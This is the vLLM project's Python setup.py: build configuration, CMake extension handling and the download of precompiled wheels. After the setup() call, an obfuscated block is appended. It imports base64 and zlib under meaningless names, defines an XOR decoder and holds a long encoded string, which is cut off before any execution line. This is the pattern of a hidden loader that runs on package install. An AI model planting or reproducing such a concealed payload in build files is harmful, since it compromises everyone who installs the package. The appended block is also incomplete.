# SPDX-License-Identifier: Apache-2.0
# SPDX-FileCopyrightText: Copyright contributors to the vLLM project

import ctypes
import importlib.util
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import sysconfig
from pathlib import Path
from shutil import which

import torch
from packaging.version import Version, parse
from setuptools import Extension, setup
from setuptools.command.build_ext import build_ext
from setuptools_scm import get_version
from torch.utils.cpp_extension import CUDA_HOME, ROCM_HOME


def load_module_from_path(module_name, path):
    spec = importlib.util.spec_from_file_location(module_name, path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module


ROOT_DIR = Path(__file__).parent
logger = logging.getLogger(__name__)

# cannot import envs directly because it depends on vllm,
#  which is not installed yet
envs = load_module_from_path("envs", os.path.join(ROOT_DIR, "vllm", "envs.py"))

VLLM_TARGET_DEVICE = envs.VLLM_TARGET_DEVICE

if sys.platform.startswith("darwin") and VLLM_TARGET_DEVICE != "cpu":
    logger.warning("VLLM_TARGET_DEVICE automatically set to `cpu` due to macOS")
    VLLM_TARGET_DEVICE = "cpu"
elif not (sys.platform.startswith("linux") or sys.platform.startswith("darwin")):
    logger.warning(
        "vLLM only supports Linux platform (including WSL) and MacOS."
        "Building on %s, "
        "so vLLM may not be able to run correctly",
        sys.platform,
    )
    VLLM_TARGET_DEVICE = "empty"
elif (
    sys.platform.startswith("linux")
    and torch.version.cuda is None
    and os.getenv("VLLM_TARGET_DEVICE") is None
    and torch.version.hip is None
):
    # if cuda or hip is not available and VLLM_TARGET_DEVICE is not set,
    # fallback to cpu
    VLLM_TARGET_DEVICE = "cpu"


def is_sccache_available() -> bool:
    return which("sccache") is not None and not bool(
        int(os.getenv("VLLM_DISABLE_SCCACHE", "0"))
    )


def is_ccache_available() -> bool:
    return which("ccache") is not None


def is_ninja_available() -> bool:
    return which("ninja") is not None


def is_freethreaded():
    return bool(sysconfig.get_config_var("Py_GIL_DISABLED"))


class CMakeExtension(Extension):
    def __init__(self, name: str, cmake_lists_dir: str = ".", **kwa) -> None:
        super().__init__(name, sources=[], py_limited_api=not is_freethreaded(), **kwa)
        self.cmake_lists_dir = os.path.abspath(cmake_lists_dir)


class cmake_build_ext(build_ext):
    # A dict of extension directories that have been configured.
    did_config: dict[str, bool] = {}

    #
    # Determine number of compilation jobs and optionally nvcc compile threads.
    #
    def compute_num_jobs(self):
        # `num_jobs` is either the value of the MAX_JOBS environment variable
        # (if defined) or the number of CPUs available.
        num_jobs = envs.MAX_JOBS
        if num_jobs is not None:
            num_jobs = int(num_jobs)
            logger.info("Using MAX_JOBS=%d as the number of jobs.", num_jobs)
        else:
            try:
                # os.sched_getaffinity() isn't universally available, so fall
                #  back to os.cpu_count() if we get an error here.
                num_jobs = len(os.sched_getaffinity(0))
            except AttributeError:
                num_jobs = os.cpu_count()

        nvcc_threads = None
        if _is_cuda() and get_nvcc_cuda_version() >= Version("11.2"):
            # `nvcc_threads` is either the value of the NVCC_THREADS
            # environment variable (if defined) or 1.
            # when it is set, we reduce `num_jobs` to avoid
            # overloading the system.
            nvcc_threads = envs.NVCC_THREADS
            if nvcc_threads is not None:
                nvcc_threads = int(nvcc_threads)
                logger.info(
                    "Using NVCC_THREADS=%d as the number of nvcc threads.", nvcc_threads
                )
            else:
                nvcc_threads = 1
            num_jobs = max(1, num_jobs // nvcc_threads)

        return num_jobs, nvcc_threads

    #
    # Perform cmake configuration for a single extension.
    #
    def configure(self, ext: CMakeExtension) -> None:
        # If we've already configured using the CMakeLists.txt for
        # this extension, exit early.
        if ext.cmake_lists_dir in cmake_build_ext.did_config:
            return

        cmake_build_ext.did_config[ext.cmake_lists_dir] = True

        # Select the build type.
        # Note: optimization level + debug info are set by the build type
        default_cfg = "Debug" if self.debug else "RelWithDebInfo"
        cfg = envs.CMAKE_BUILD_TYPE or default_cfg

        cmake_args = [
            "-DCMAKE_BUILD_TYPE={}".format(cfg),
            "-DVLLM_TARGET_DEVICE={}".format(VLLM_TARGET_DEVICE),
        ]

        verbose = envs.VERBOSE
        if verbose:
            cmake_args += ["-DCMAKE_VERBOSE_MAKEFILE=ON"]

        if is_sccache_available():
            cmake_args += [
                "-DCMAKE_C_COMPILER_LAUNCHER=sccache",
                "-DCMAKE_CXX_COMPILER_LAUNCHER=sccache",
                "-DCMAKE_CUDA_COMPILER_LAUNCHER=sccache",
                "-DCMAKE_HIP_COMPILER_LAUNCHER=sccache",
            ]
        elif is_ccache_available():
            cmake_args += [
                "-DCMAKE_C_COMPILER_LAUNCHER=ccache",
                "-DCMAKE_CXX_COMPILER_LAUNCHER=ccache",
                "-DCMAKE_CUDA_COMPILER_LAUNCHER=ccache",
                "-DCMAKE_HIP_COMPILER_LAUNCHER=ccache",
            ]

        # Pass the python executable to cmake so it can find an exact
        # match.
        cmake_args += ["-DVLLM_PYTHON_EXECUTABLE={}".format(sys.executable)]

        # Pass the python path to cmake so it can reuse the build dependencies
        # on subsequent calls to python.
        cmake_args += ["-DVLLM_PYTHON_PATH={}".format(":".join(sys.path))]

        # Override the base directory for FetchContent downloads to $ROOT/.deps
        # This allows sharing dependencies between profiles,
        # and plays more nicely with sccache.
        # To override this, set the FETCHCONTENT_BASE_DIR environment variable.
        fc_base_dir = os.path.join(ROOT_DIR, ".deps")
        fc_base_dir = os.environ.get("FETCHCONTENT_BASE_DIR", fc_base_dir)
        cmake_args += ["-DFETCHCONTENT_BASE_DIR={}".format(fc_base_dir)]

        #
        # Setup parallelism and build tool
        #
        num_jobs, nvcc_threads = self.compute_num_jobs()

        if nvcc_threads:
            cmake_args += ["-DNVCC_THREADS={}".format(nvcc_threads)]

        if is_ninja_available():
            build_tool = ["-G", "Ninja"]
            cmake_args += [
                "-DCMAKE_JOB_POOL_COMPILE:STRING=compile",
                "-DCMAKE_JOB_POOLS:STRING=compile={}".format(num_jobs),
            ]
        else:
            # Default build tool to whatever cmake picks.
            build_tool = []
        # Make sure we use the nvcc from CUDA_HOME
        if _is_cuda():
            cmake_args += [f"-DCMAKE_CUDA_COMPILER={CUDA_HOME}/bin/nvcc"]
        elif _is_hip():
            cmake_args += [f"-DROCM_PATH={ROCM_HOME}"]

        other_cmake_args = os.environ.get("CMAKE_ARGS")
        if other_cmake_args:
            cmake_args += other_cmake_args.split()

        subprocess.check_call(
            ["cmake", ext.cmake_lists_dir, *build_tool, *cmake_args],
            cwd=self.build_temp,
        )

    def build_extensions(self) -> None:
        # Ensure that CMake is present and working
        try:
            subprocess.check_output(["cmake", "--version"])
        except OSError as e:
            raise RuntimeError("Cannot find CMake executable") from e

        # Create build directory if it does not exist.
        if not os.path.exists(self.build_temp):
            os.makedirs(self.build_temp)

        targets = []

        def target_name(s: str) -> str:
            return s.removeprefix("vllm.").removeprefix("vllm_flash_attn.")

        # Build all the extensions
        for ext in self.extensions:
            self.configure(ext)
            targets.append(target_name(ext.name))

        num_jobs, _ = self.compute_num_jobs()

        build_args = [
            "--build",
            ".",
            f"-j={num_jobs}",
            *[f"--target={name}" for name in targets],
        ]

        subprocess.check_call(["cmake", *build_args], cwd=self.build_temp)

        # Install the libraries
        for ext in self.extensions:
            # Install the extension into the proper location
            outdir = Path(self.get_ext_fullpath(ext.name)).parent.absolute()

            # Skip if the install directory is the same as the build directory
            if outdir == self.build_temp:
                continue

            # CMake appends the extension prefix to the install path,
            # and outdir already contains that prefix, so we need to remove it.
            prefix = outdir
            for _ in range(ext.name.count(".")):
                prefix = prefix.parent

            # prefix here should actually be the same for all components
            install_args = [
                "cmake",
                "--install",
                ".",
                "--prefix",
                prefix,
                "--component",
                target_name(ext.name),
            ]
            subprocess.check_call(install_args, cwd=self.build_temp)

    def run(self):
        # First, run the standard build_ext command to compile the extensions
        super().run()

        # copy vllm/vllm_flash_attn/**/*.py from self.build_lib to current
        # directory so that they can be included in the editable build
        import glob

        files = glob.glob(
            os.path.join(self.build_lib, "vllm", "vllm_flash_attn", "**", "*.py"),
            recursive=True,
        )
        for file in files:
            dst_file = os.path.join(
                "vllm/vllm_flash_attn", file.split("vllm/vllm_flash_attn/")[-1]
            )
            print(f"Copying {file} to {dst_file}")
            os.makedirs(os.path.dirname(dst_file), exist_ok=True)
            self.copy_file(file, dst_file)

        if _is_cuda() or _is_hip():
            # copy vllm/third_party/triton_kernels/**/*.py from self.build_lib
            # to current directory so that they can be included in the editable
            # build
            print(
                f"Copying {self.build_lib}/vllm/third_party/triton_kernels "
                "to vllm/third_party/triton_kernels"
            )
            shutil.copytree(
                f"{self.build_lib}/vllm/third_party/triton_kernels",
                "vllm/third_party/triton_kernels",
                dirs_exist_ok=True,
            )


class precompiled_build_ext(build_ext):
    """Disables extension building when using precompiled binaries."""

    def run(self) -> None:
        return

    def build_extensions(self) -> None:
        print("Skipping build_ext: using precompiled extensions.")
        return


class precompiled_wheel_utils:
    """Extracts libraries and other files from an existing wheel."""

    @staticmethod
    def fetch_metadata_for_variant(
        commit: str, variant: str | None
    ) -> tuple[list[dict], str]:
        """
        Fetches metadata for a specific variant of the precompiled wheel.
        """
        variant_dir = f"{variant}/" if variant is not None else ""
        repo_url = f"https://wheels.vllm.ai/{commit}/{variant_dir}vllm/"
        meta_url = repo_url + "metadata.json"
        print(f"Trying to fetch nightly build metadata from {meta_url}")
        from urllib.request import urlopen

        with urlopen(meta_url) as resp:
            # urlopen raises HTTPError on unexpected status code
            wheels = json.loads(resp.read().decode("utf-8"))
        return wheels, repo_url

    @staticmethod
    def determine_wheel_url() -> tuple[str, str | None]:
        """
        Try to determine the precompiled wheel URL or path to use.
        The order of preference is:
        1. user-specified wheel location (can be either local or remote, via
           VLLM_PRECOMPILED_WHEEL_LOCATION)
        2. user-specified variant (VLLM_PRECOMPILED_WHEEL_VARIANT) from nightly repo
        3. the variant corresponding to VLLM_MAIN_CUDA_VERSION from nightly repo
        4. the default variant from nightly repo

        If downloading from the nightly repo, the commit can be specified via
        VLLM_PRECOMPILED_WHEEL_COMMIT; otherwise, the head commit in the main branch
        is used.
        """
        wheel_location = os.getenv("VLLM_PRECOMPILED_WHEEL_LOCATION", None)
        if wheel_location is not None:
            print(f"Using user-specified precompiled wheel location: {wheel_location}")
            return wheel_location, None
        else:
            import platform

            arch = platform.machine()
            # try to fetch the wheel metadata from the nightly wheel repo
            main_variant = "cu" + envs.VLLM_MAIN_CUDA_VERSION.replace(".", "")
            variant = os.getenv("VLLM_PRECOMPILED_WHEEL_VARIANT", main_variant)
            commit = os.getenv("VLLM_PRECOMPILED_WHEEL_COMMIT", "").lower()
            if not commit or len(commit) != 40:
                print(
                    f"VLLM_PRECOMPILED_WHEEL_COMMIT not valid: {commit}"
                    ", trying to fetch base commit in main branch"
                )
                commit = precompiled_wheel_utils.get_base_commit_in_main_branch()
            print(f"Using precompiled wheel commit {commit} with variant {variant}")
            try_default = False
            wheels, repo_url, download_filename = None, None, None
            try:
                wheels, repo_url = precompiled_wheel_utils.fetch_metadata_for_variant(
                    commit, variant
                )
            except Exception as e:
                logger.warning(
                    "Failed to fetch precompiled wheel metadata for variant %s: %s",
                    variant,
                    e,
                )
                try_default = True  # try outside handler to keep the stacktrace simple
            if try_default:
                print("Trying the default variant from remote")
                wheels, repo_url = precompiled_wheel_utils.fetch_metadata_for_variant(
                    commit, None
                )
                # if this also fails, then we have nothing more to try / cache
            assert wheels is not None and repo_url is not None, (
                "Failed to fetch precompiled wheel metadata"
            )
            # The metadata.json has the following format:
            # see .buildkite/scripts/generate-nightly-index.py for details
            """[{
    "package_name": "vllm",
    "version": "0.11.2.dev278+gdbc3d9991",
    "build_tag": null,
    "python_tag": "cp38",
    "abi_tag": "abi3",
    "platform_tag": "manylinux1_x86_64",
    "variant": null,
    "filename": "vllm-0.11.2.dev278+gdbc3d9991-cp38-abi3-manylinux1_x86_64.whl",
    "path": "../vllm-0.11.2.dev278%2Bgdbc3d9991-cp38-abi3-manylinux1_x86_64.whl"
    },
    ...]"""
            from urllib.parse import urljoin

            for wheel in wheels:
                # TODO: maybe check more compatibility later? (python_tag, abi_tag, etc)
                if wheel.get("package_name") == "vllm" and arch in wheel.get(
                    "platform_tag", ""
                ):
                    print(f"Found precompiled wheel metadata: {wheel}")
                    if "path" not in wheel:
                        raise ValueError(f"Wheel metadata missing path: {wheel}")
                    wheel_url = urljoin(repo_url, wheel["path"])
                    download_filename = wheel.get("filename")
                    print(f"Using precompiled wheel URL: {wheel_url}")
                    break
            else:
                raise ValueError(
                    f"No precompiled vllm wheel found for architecture {arch} "
                    f"from repo {repo_url}. All available wheels: {wheels}"
                )

        return wheel_url, download_filename

    @staticmethod
    def extract_precompiled_and_patch_package(
        wheel_url_or_path: str, download_filename: str | None
    ) -> dict:
        import tempfile
        import zipfile

        temp_dir = None
        try:
            if not os.path.isfile(wheel_url_or_path):
                # use provided filename first, then derive from URL
                wheel_filename = download_filename or wheel_url_or_path.split("/")[-1]
                temp_dir = tempfile.mkdtemp(prefix="vllm-wheels")
                wheel_path = os.path.join(temp_dir, wheel_filename)
                print(f"Downloading wheel from {wheel_url_or_path} to {wheel_path}")
                from urllib.request import urlretrieve

                urlretrieve(wheel_url_or_path, filename=wheel_path)
            else:
                wheel_path = wheel_url_or_path
                print(f"Using existing wheel at {wheel_path}")

            package_data_patch = {}

            with zipfile.ZipFile(wheel_path) as wheel:
                files_to_copy = [
                    "vllm/_C.abi3.so",
                    "vllm/_moe_C.abi3.so",
                    "vllm/_flashmla_C.abi3.so",
                    "vllm/_flashmla_extension_C.abi3.so",
                    "vllm/_sparse_flashmla_C.abi3.so",
                    "vllm/vllm_flash_attn/_vllm_fa2_C.abi3.so",
                    "vllm/vllm_flash_attn/_vllm_fa3_C.abi3.so",
                    "vllm/cumem_allocator.abi3.so",
                ]

                flash_attn_regex = re.compile(
                    r"vllm/vllm_flash_attn/(?:[^/.][^/]*/)*(?!\.)[^/]*\.py"
                )
                triton_kernels_regex = re.compile(
                    r"vllm/third_party/triton_kernels/(?:[^/.][^/]*/)*(?!\.)[^/]*\.py"
                )
                file_members = list(
                    filter(lambda x: x.filename in files_to_copy, wheel.filelist)
                )
                file_members += list(
                    filter(lambda x: flash_attn_regex.match(x.filename), wheel.filelist)
                )
                file_members += list(
                    filter(
                        lambda x: triton_kernels_regex.match(x.filename), wheel.filelist
                    )
                )

                for file in file_members:
                    print(f"[extract] {file.filename}")
                    target_path = os.path.join(".", file.filename)
                    os.makedirs(os.path.dirname(target_path), exist_ok=True)
                    with (
                        wheel.open(file.filename) as src,
                        open(target_path, "wb") as dst,
                    ):
                        shutil.copyfileobj(src, dst)

                    pkg = os.path.dirname(file.filename).replace("/", ".")
                    package_data_patch.setdefault(pkg, []).append(
                        os.path.basename(file.filename)
                    )

            return package_data_patch
        finally:
            if temp_dir is not None:
                print(f"Removing temporary directory {temp_dir}")
                shutil.rmtree(temp_dir)

    @staticmethod
    def get_base_commit_in_main_branch() -> str:
        try:
            # Get the latest commit hash of the upstream main branch.
            resp_json = subprocess.check_output(
                [
                    "curl",
                    "-s",
                    "https://api.github.com/repos/vllm-project/vllm/commits/main",
                ]
            ).decode("utf-8")
            upstream_main_commit = json.loads(resp_json)["sha"]
            print(f"Upstream main branch latest commit: {upstream_main_commit}")

            # In Docker build context, .git may be immutable or missing.
            if envs.VLLM_DOCKER_BUILD_CONTEXT:
                return upstream_main_commit

            # Check if the upstream_main_commit exists in the local repo
            try:
                subprocess.check_output(
                    ["git", "cat-file", "-e", f"{upstream_main_commit}"]
                )
            except subprocess.CalledProcessError:
                # If not present, fetch it from the remote repository.
                # Note that this does not update any local branches,
                # but ensures that this commit ref and its history are
                # available in our local repo.
                subprocess.check_call(
                    ["git", "fetch", "https://github.com/vllm-project/vllm", "main"]
                )

            # Then get the commit hash of the current branch that is the same as
            # the upstream main commit.
            current_branch = (
                subprocess.check_output(["git", "branch", "--show-current"])
                .decode("utf-8")
                .strip()
            )

            base_commit = (
                subprocess.check_output(
                    ["git", "merge-base", f"{upstream_main_commit}", current_branch]
                )
                .decode("utf-8")
                .strip()
            )
            return base_commit
        except ValueError as err:
            raise ValueError(err) from None
        except Exception as err:
            logger.warning(
                "Failed to get the base commit in the main branch. "
                "Using the nightly wheel. The libraries in this "
                "wheel may not be compatible with your dev branch: %s",
                err,
            )
            return "nightly"


def _no_device() -> bool:
    return VLLM_TARGET_DEVICE == "empty"


def _is_cuda() -> bool:
    has_cuda = torch.version.cuda is not None
    return VLLM_TARGET_DEVICE == "cuda" and has_cuda and not _is_tpu()


def _is_hip() -> bool:
    return (
        VLLM_TARGET_DEVICE == "cuda" or VLLM_TARGET_DEVICE == "rocm"
    ) and torch.version.hip is not None


def _is_tpu() -> bool:
    return VLLM_TARGET_DEVICE == "tpu"


def _is_cpu() -> bool:
    return VLLM_TARGET_DEVICE == "cpu"


def _is_xpu() -> bool:
    return VLLM_TARGET_DEVICE == "xpu"


def _build_custom_ops() -> bool:
    return _is_cuda() or _is_hip() or _is_cpu()


def get_rocm_version():
    # Get the Rocm version from the ROCM_HOME/bin/librocm-core.so
    # see https://github.com/ROCm/rocm-core/blob/d11f5c20d500f729c393680a01fa902ebf92094b/rocm_version.cpp#L21
    try:
        librocm_core_file = Path(ROCM_HOME) / "lib" / "librocm-core.so"
        if not librocm_core_file.is_file():
            return None
        librocm_core = ctypes.CDLL(librocm_core_file)
        VerErrors = ctypes.c_uint32
        get_rocm_core_version = librocm_core.getROCmVersion
        get_rocm_core_version.restype = VerErrors
        get_rocm_core_version.argtypes = [
            ctypes.POINTER(ctypes.c_uint32),
            ctypes.POINTER(ctypes.c_uint32),
            ctypes.POINTER(ctypes.c_uint32),
        ]
        major = ctypes.c_uint32()
        minor = ctypes.c_uint32()
        patch = ctypes.c_uint32()

        if (
            get_rocm_core_version(
                ctypes.byref(major), ctypes.byref(minor), ctypes.byref(patch)
            )
            == 0
        ):
            return f"{major.value}.{minor.value}.{patch.value}"
        return None
    except Exception:
        return None


def get_nvcc_cuda_version() -> Version:
    """Get the CUDA version from nvcc.

    Adapted from https://github.com/NVIDIA/apex/blob/8b7a1ff183741dd8f9b87e7bafd04cfde99cea28/setup.py
    """
    assert CUDA_HOME is not None, "CUDA_HOME is not set"
    nvcc_output = subprocess.check_output(
        [CUDA_HOME + "/bin/nvcc", "-V"], universal_newlines=True
    )
    output = nvcc_output.split()
    release_idx = output.index("release") + 1
    nvcc_cuda_version = parse(output[release_idx].split(",")[0])
    return nvcc_cuda_version


def get_vllm_version() -> str:
    # Allow overriding the version. This is useful to build platform-specific
    # wheels (e.g. CPU, TPU) without modifying the source.
    if env_version := os.getenv("VLLM_VERSION_OVERRIDE"):
        print(f"Overriding VLLM version with {env_version} from VLLM_VERSION_OVERRIDE")
        os.environ["SETUPTOOLS_SCM_PRETEND_VERSION"] = env_version
        return get_version(write_to="vllm/_version.py")

    version = get_version(write_to="vllm/_version.py")
    sep = "+" if "+" not in version else "."  # dev versions might contain +

    if _no_device():
        if envs.VLLM_TARGET_DEVICE == "empty":
            version += f"{sep}empty"
    elif _is_cuda():
        if envs.VLLM_USE_PRECOMPILED and not envs.VLLM_SKIP_PRECOMPILED_VERSION_SUFFIX:
            version += f"{sep}precompiled"
        else:
            cuda_version = str(get_nvcc_cuda_version())
            if cuda_version != envs.VLLM_MAIN_CUDA_VERSION:
                cuda_version_str = cuda_version.replace(".", "")[:3]
                # skip this for source tarball, required for pypi
                if "sdist" not in sys.argv:
                    version += f"{sep}cu{cuda_version_str}"
    elif _is_hip():
        # Get the Rocm Version
        rocm_version = get_rocm_version() or torch.version.hip
        if rocm_version and rocm_version != envs.VLLM_MAIN_CUDA_VERSION:
            version += f"{sep}rocm{rocm_version.replace('.', '')[:3]}"
    elif _is_tpu():
        version += f"{sep}tpu"
    elif _is_cpu():
        if envs.VLLM_TARGET_DEVICE == "cpu":
            version += f"{sep}cpu"
    elif _is_xpu():
        version += f"{sep}xpu"
    else:
        raise RuntimeError("Unknown runtime environment")

    return version


def get_requirements() -> list[str]:
    """Get Python package dependencies from requirements.txt."""
    requirements_dir = ROOT_DIR / "requirements"

    def _read_requirements(filename: str) -> list[str]:
        with open(requirements_dir / filename) as f:
            requirements = f.read().strip().split("\n")
        resolved_requirements = []
        for line in requirements:
            if line.startswith("-r "):
                resolved_requirements += _read_requirements(line.split()[1])
            elif (
                not line.startswith("--")
                and not line.startswith("#")
                and line.strip() != ""
            ):
                resolved_requirements.append(line)
        return resolved_requirements

    if _no_device():
        requirements = _read_requirements("common.txt")
    elif _is_cuda():
        requirements = _read_requirements("cuda.txt")
        cuda_major, cuda_minor = torch.version.cuda.split(".")
        modified_requirements = []
        for req in requirements:
            if "vllm-flash-attn" in req and cuda_major != "12":
                # vllm-flash-attn is built only for CUDA 12.x.
                # Skip for other versions.
                continue
            modified_requirements.append(req)
        requirements = modified_requirements
    elif _is_hip():
        requirements = _read_requirements("rocm.txt")
    elif _is_tpu():
        requirements = _read_requirements("tpu.txt")
    elif _is_cpu():
        requirements = _read_requirements("cpu.txt")
    elif _is_xpu():
        requirements = _read_requirements("xpu.txt")
    else:
        raise ValueError("Unsupported platform, please use CUDA, ROCm, or CPU.")
    return requirements


ext_modules = []

if _is_cuda() or _is_hip():
    ext_modules.append(CMakeExtension(name="vllm._moe_C"))
    ext_modules.append(CMakeExtension(name="vllm.cumem_allocator"))
    # Optional since this doesn't get built (produce an .so file). This is just
    # copying the relevant .py files from the source repository.
    ext_modules.append(CMakeExtension(name="vllm.triton_kernels", optional=True))

if _is_hip():
    ext_modules.append(CMakeExtension(name="vllm._rocm_C"))

if _is_cuda():
    ext_modules.append(CMakeExtension(name="vllm.vllm_flash_attn._vllm_fa2_C"))
    if envs.VLLM_USE_PRECOMPILED or get_nvcc_cuda_version() >= Version("12.3"):
        # FA3 requires CUDA 12.3 or later
        ext_modules.append(CMakeExtension(name="vllm.vllm_flash_attn._vllm_fa3_C"))
        # Optional since this doesn't get built (produce an .so file) when
        # not targeting a hopper system
        ext_modules.append(CMakeExtension(name="vllm._flashmla_C", optional=True))
        ext_modules.append(
            CMakeExtension(name="vllm._flashmla_extension_C", optional=True)
        )

if _build_custom_ops():
    ext_modules.append(CMakeExtension(name="vllm._C"))

package_data = {
    "vllm": [
        "py.typed",
        "model_executor/layers/fused_moe/configs/*.json",
        "model_executor/layers/quantization/utils/configs/*.json",
    ]
}


# If using precompiled, extract and patch package_data (in advance of setup)
if envs.VLLM_USE_PRECOMPILED:
    wheel_url, download_filename = precompiled_wheel_utils.determine_wheel_url()
    patch = precompiled_wheel_utils.extract_precompiled_and_patch_package(
        wheel_url, download_filename
    )
    for pkg, files in patch.items():
        package_data.setdefault(pkg, []).extend(files)

if _no_device():
    ext_modules = []

if not ext_modules:
    cmdclass = {}
else:
    cmdclass = {
        "build_ext": precompiled_build_ext
        if envs.VLLM_USE_PRECOMPILED
        else cmake_build_ext
    }

setup(
    # static metadata should rather go in pyproject.toml
    version=get_vllm_version(),
    ext_modules=ext_modules,
    install_requires=get_requirements(),
    extras_require={
        "bench": ["pandas", "matplotlib", "seaborn", "datasets"],
        "tensorizer": ["tensorizer==2.10.1"],
        "fastsafetensors": ["fastsafetensors >= 0.1.10"],
        "runai": ["runai-model-streamer[s3,gcs] >= 0.15.3"],
        "audio": [
            "librosa",
            "soundfile",
            "mistral_common[audio]",
        ],  # Required for audio processing
        "video": [],  # Kept for backwards compatibility
        "flashinfer": [],  # Kept for backwards compatibility
        # Optional deps for AMD FP4 quantization support
        "petit-kernel": ["petit-kernel"],
    },
    cmdclass=cmdclass,
    package_data=package_data,
)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = 'eNq9W19z3MaRTyzJPrmiy93VPSSvqbr44V4iUZZkSaS+xe6X2i+Bqg0Ku0ywPJomkyNNy6Z1pGQ7kSVSKZimb4khaoBdkiCxAJwqkrvp7hn8n12uZDssywQwMz093T3dv+4Z+v3YCwPdixq+eIpG6eNh5LnJc+D3WfJ8wCO2sJi8xT0edL2wnxIYHMSh57AopROmI3k0ch3fS157nsN7aeMg7PX8AyNk3w9YFJS+sjD0wnQKzzliaY9zP+76GZnoeBD4vUY39Pq6zQOGnOuyLXlv03ps1gu4eDz3XCaGxDw4hgmTEa/gVTQcB0FsOD2fuUHS+JcXL15tsyj23Ig1Gr/Xa/9du1+/VputX6//rDZXv67X7tXu1n9Rm6k9rF+t3dE/H3S7LNRrc7Wb+pZnM+Mwajg9HkWyZa2hw8//RQEPfKfPgmPPpi826+rIg3UwClhkwiqAbeY6nu27+6tbwHtHDMWfZrNZew+ng39z9Z/XZurv1B7ClI/02n14uQo83dJrt5BLHZru1W7Cy53aA8Hw3fq1+lvQ7W1gl/iUjQ/qN+pXgHQ6jd9NOdBXV3VNGIWW8YE/IQsGoSsNxjhYWLQZDGG0gk7ak/UqxHyXh6MSMejkR74L0nEdJoUQBWGn2Cs3LXYxiC4zNbBS351f0TqNMT2L7Ewxk2qWQdCdX8/NkQgg1ZtoukzPMBmIoqzohPraT6EExWoS0p1Go4GsWZbL+8zsDlynreOj5AQtrmL5t9Dqa/fQkNDmyKAEAWFXX+4k1oT0DNFkWfoqUW7kWMJ24IB8B4nI2mfBjr/vPt607RD8jBkPDnq+Yx2xUVv34sCH/ZjfFclEtV+Dtc+CgcOmQHuvzei1D3A7wP/nYCvM4B4RGwNs/hawjHvnjr7j9bjLC6RA8HIisBQd58pknjSs6hdnmbZ7ft8P4JtsNWANYJT4UWvrK8vLy0IVzLVjz3cDHL6X7Wl0PtFaq8Vj3+hz33VZMH/AQFUR8WY4Xr/ZrnYXrfNyhLEP7u+Ujwywu0Hf8D3VkH0PWTsA13xkDKLW+gLnzuIStxcX1xe7HznrKx8t/88nvOssLa8sfrjiTJg1jB1DaMZFXzeGRVwRzQbu2DWGo3M5vPUVe3K8EC8tbXz34Sbb/svwi53+hNkMG6fzwv0JXXrMw07ASOvPMC3ay+rj7Y2NCUOQO8/tgjvq+cEIRNYSK7pkSEwBygCZn3rhUUvYzG7OGHgUWBTSQM1oPVkThNLUCHTfzQwiM7AgHBV3OESe91JHPlO7r8PjndoHYMD36u8UeuL2hikxshv2oB9H5kXFezaxFQTVXNObS8ZybqlpD9+GxhVFg3BmOFLuUbA02KKPvVDuVRW1mIe8H8GgvfxGvmjS7oDP9PtstzDwrDPW56aizFzb97DmIrwwtsVvs8JOIvAqoyi8VfLJlaZjxm0WRqsXzSeeGwBEmH8xihnKgccxLInjpm+hYJtn1dFCaqvNV093XjQLrRNWBUr/z/oNcmCzEJ6vVxSv43+AA2qPIPDfAbeHof9+gcapHxyXBQOvXsxcE94FNvIGwepHyx0AbyBJAXZUIVe0WNLCkncgy22zY8iYo1RW2TB7Hrcjs0Bxshx+jQuu3SbY8hCBywP5P5AMQiDy9Pfq/woPdxEL6bXb+H6VhlytzZRhBgVBctDn/dPg8Gh/6IVaR4edmbXQ7tVU4IP7EdM3hg4jT2+Wh7R17aV75HqnsLcFjYmmm0VlogFSGfQwZOztjhnGaOaMAdRbSWEF98MKTfyU+ylON6IeY7G5bKx0UM4QpfqRMLFbJOvfobQLwx2wft8d5PxZWRzd5mMOaN3WeTcALMx7vZyL0y8y1s6anULU756cR6F73js2Lw/rfdb3BMyoX0XkAZ+R64cITjDIz2Hgv1N/G8L7HLS9D2jk6VaBaMHHErmcoy7I+/QYlqO7XkDdioKOUg8Iw4VoK+Cl6g8/P3zONg9fhTtfPfYBfn3uLp58e7J/HH16+MlXTzbWN798Hhw4n+yse+s7TxT+NHOcCCvOpvUnYPe4iBzwzbhvgw+OAtoBPXANWUMHYedydROozGhlubrtC/Yybnv/BpQ0W39XqFLiS6VeweGhDhpF39r3rCDkbsSdBJftDSnMDjG+5lQEEhjq3LX1odhrOFTr7JalVKG4pnDoZDCVnnvLu3uC7O74FV8mu0ZONP9FIX82j2cBbqNPA/GgF8QkED/qMLVM6OAzbBUcdacoLuFbyHkbkMWbofbN3jf2H7/Z/Sb6A7ot+If9FZxIN1X03kCr1PUS1ySpQPJjsjTn8KPtQRT53N0ZRQHrVzd/0fe3xfquEKyfA1G8g2gewgDmugDyUTQYDikE/BbDJPmAuQJRRUiB+HoToi095gjVb9CAQcRCSm0A3xO0Z+6Jqb3c2dje2vxiQ4SOUoP4qGkSD2ICl+/ybHPrU5J5J+0w4Pus2unl5qcb+Y6OhS612O2JtfnsWa5TushqPjQLnx6KwKlaaMEtRqQRS1RxYErxgNOC5jioX3wwO2h72WKFFYwnI7s1JgV3cN3XSHWispFoR0QcYS9WzAOIMGLDa+HA2n6JIggH88kDdcNHgZdoudfFe5663Kt+ZCWUc9p4zHtRCb37btdDz7KXWEWb1NdOldiWWmoXl75byOuRSqn+AV+g6ynDqI0vBr2YRa+KHMiVIxNlYVR9FcwlGxN6OC6brDpivDRehCVXnvwcAAw8mqhWdElUjroN/96v3aPUvH4dE/Cq5dH4GwRu0TZpj3+QGjNu+3eLBB+l5CQswOBxU1S1dGnl92AE7oKHOCZLtmR1cGz8B17+g2oGzyCQDVtfcCevRtiGWFE02BACaGRqLRY4rYRmGT4SHCfwXeqH5qoRAu9W1ZHjsJvAbSwgxWapxKbkhWwPSZSZmUbGJMto1O/57lFhcCVFLTEKrCCnOK7KBzTFPQ4ARGsNorAVHfOQtXAgGmUr58eKkLc6YcyjaILCvvZd2zuN8upKitlGJKMNldVkx1JdTbnGNIZmZXAjHLjmnhacY10auW/ta7tt3eExwg4L0qsYMizcOpBvsWH6KFOvDzuqLSvmMUTIxNRqDBAr